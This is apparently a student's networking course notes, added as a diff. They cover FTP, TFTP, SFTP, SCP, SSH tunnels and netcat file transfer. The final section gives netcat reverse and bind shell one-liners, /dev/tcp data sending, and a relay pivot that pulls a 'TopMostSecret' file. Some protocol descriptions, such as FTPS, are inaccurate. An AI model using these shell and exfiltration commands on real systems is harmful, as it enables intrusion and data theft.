@@ -1,0 +1,85 @@
+TFTP
+  UDP, small and simple, no terminal comms, no auth or encryption, no directory services, used to push OS updates
+FTP
+  TCP, multiple connections, port21 is control connection(server side), port20 is data connection(client), auth thru clear-test sign in (user:pass)
+  insecure by default (no encryption,anonymous sign on), has directory services, can be enhanced with SSL/TLS (thru ssh = FTPS)
+    
+    ftp
+  Active(default)
+    client to server(21), server reaches out, you ack, then server sends data
+  Passive
+    server does not reach out in this mode
+
+    to use passive, simply connect thru ftp and type 'passive'
+SFTP
+  FTP thru SSH, interactive terminal, over port 22, encrypted
+FTPS
+  FTP with SSH like services but through TCP port 443 (HTTPS default port), used when SSH/port22 is blocked, extremely similar to SFTP
+SCP
+  TCP port 22, non interactive ssh, uses symmetric and asymmetric encryption, auth thru sign in
+NETCAT (nc)
+      Can be used for the following:  inbound and outbound connections, TCP/UDP, to or from any ports,troubleshooting network connections,sending/receiving data (insecurely),
+      port scanning (similar to -sT in Nmap)
+
+    
+some commands
+    ftp <ip>
+      get <fileName>
+    wget -r ftp://<ip>/<fileName>
+      wget usually used for web traffic but can be used with ftp
+    scp <user>@<ip>:<fileName>.<ext> <their Dir>
+      download
+    scp <ourFileName.ext> <user>@<ip>:<their DIR>
+      upload
+    scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+      Copy from remote to a seperate remote
+    scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+      Download a file from a remote directory to a local directory
+    scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+      Upload a file to a remote directory from a local directory
+    
+    THROUGH A TUNNEL
+    ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+      scp -P 1111 student@localhost:secretstuff.txt /home/student
+        Download a file from a remote directory to a local directory
+      scp -P 1111 secretstuff.txt student@localhost:/home/student
+        Upload a file to a remote directory from a local directory
+    Client (sends file): nc 10.2.0.2 9001 < file.txt
+    Listener (receive file): nc -l -p 9001 > newfile.txt
+    Listener (sends file): nc -l -p 9001 < file.txt
+    Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+    NETCAT Relay
+        On Client Relay:
+          mknod mypipe p
+          nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+        On Listener2 (sends info):
+          nc -l -p 9002 < infile.txt
+        On Listener1 (receives info):
+          nc -l -p 9001 > outfile.txt
+        Writes the output to listener1 and listener2 through the named pipe
+            
+        On the receiving box:
+          nc -l -p 1111 > file.txt
+
+        On the sending box:
+          cat file.txt > /dev/tcp/10.2.0.2/1111
+
+This method is useful for host that does not have NETCAT available.
+  Reverse shell using NETCAT
+
+When shelled into the remote host using -c :
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+/bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+nc -l -p <any unfiltered port> -e /bin/bash
+
+nc -lp 9001 0< pipe | nc -lp 9002 1> pipe    (on pivot)(listening port must be up first)
+            0< is input, we are creating a pipe file on through a listening port, a named pipe only lives in memory NOT in file storage.
+  nc 10.0.0.103 9002 > TopMostSecret    (on target)
+  nc nc 10.0.0.103 9001 > Testfile    (on OUR machine)
